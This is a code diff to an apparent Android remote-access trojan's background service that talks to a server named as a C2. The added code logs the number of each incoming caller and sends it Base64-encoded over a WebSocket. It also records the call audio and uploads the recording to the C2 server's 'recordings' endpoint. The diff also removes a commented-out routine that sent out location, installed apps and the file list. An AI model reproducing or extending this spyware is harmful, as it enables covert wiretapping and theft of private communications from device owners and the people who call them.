@@ -4,7 +4,9 @@ import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.media.MediaRecorder;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.telephony.SmsMessage;
@@ -22,6 +24,8 @@ import com.ot.grhq.client.functionality.Utils;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.File;
+import java.io.IOException;
 import java.net.URI;
 import java.net.URISyntaxException;
 
@@ -30,7 +34,15 @@ public class MainService extends Service {
     private final String SERVICE_RESTART_INTENT = "com.ot.grhq.receiver.restartservice";
     private static final String SERVER_URI = "ws://192.168.8.102:8080";
 
+    private static final String C2_SERVER = "https://localhost/";
+
     private static WebSocketClient client;
+
+    private static MediaRecorder recorder = new MediaRecorder();
+
+    private static File audiofile = null;
+
+    private static String incomingNumber;
 
 
     @Nullable
@@ -50,23 +62,6 @@ public class MainService extends Service {
         if (!client.isOpen())
             client.connect();
 
-//        try {
-//            JSONObject json = new JSONObject();
-//            Object location = Location.getLastKnownLocation(getApplicationContext());
-//            Object installedApps = PackageManager.getInstalledApps(getApplicationContext());
-//            Object files = FileManager.listFiles("/");
-//
-//            json.put("location", location.toString());
-//            json.put("installed_apps", installedApps.toString());
-//            json.put("files", files.toString());
-//            client.send(json.toString());
-//        } catch (URISyntaxException e) {
-//            throw new RuntimeException(e);
-//        } catch (JSONException e) {
-//            throw new RuntimeException(e);
-//        }
-
-        Log.d("eeee", "First");
         final Handler handler = new Handler();
         final int delay = 1000;
 
@@ -101,14 +96,59 @@ public class MainService extends Service {
                 if (phoneState != null) {
                     if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                         // Incoming call is ringing
-                        String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
+                        incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
+                        Log.d("eeee", incomingNumber);
+
+                        JSONObject json = new JSONObject();
+                        try {
+                            json.put("client_id", Utils.clientID(context));
+                            json.put("type", "client");
+                            json.put("res", "log");
+                            json.put("number", Base64.encode(incomingNumber.getBytes(), Base64.DEFAULT));
+                            json.put("timestamp", System.currentTimeMillis());
+
+                            client.send(json.toString());
+                        } catch (JSONException e) {
+                            throw new RuntimeException(e);
+                        }
 
                     } else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                         // Call is in progress (either incoming or outgoing)
+                        //Creating file
+                        File dir = Environment.getExternalStorageDirectory();
+                        try {
+                            audiofile = File.createTempFile(String.valueOf(System.currentTimeMillis()), ".ogg", dir);
+
+                            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
+                            recorder.setOutputFormat(MediaRecorder.OutputFormat.OGG);
+                            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
+                            recorder.setOutputFile(audiofile.getAbsolutePath());
+                            recorder.prepare();
+                            recorder.start();
+                        } catch (IOException e) {}
 
                     } else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                         // Call has ended
+                        recorder.stop();
+                        recorder.release();
 
+                        Log.d("eeee", audiofile.getAbsolutePath());
+
+                        FileManager.uploadFile(audiofile.getAbsolutePath(), C2_SERVER + "recordings");
+
+                        JSONObject json = new JSONObject();
+                        try {
+                            json.put("client_id", Utils.clientID(context));
+                            json.put("type", "client");
+                            json.put("res", "recording");
+                            json.put("number", Base64.encode(incomingNumber.getBytes(), Base64.DEFAULT));
+                            json.put("filename", Base64.encode(audiofile.getName().getBytes(), Base64.DEFAULT));
+                            json.put("timestamp", System.currentTimeMillis());
+
+                            client.send(json.toString());
+                        } catch (JSONException e) {
+                            throw new RuntimeException(e);
+                        }
                     }
                 }
             }
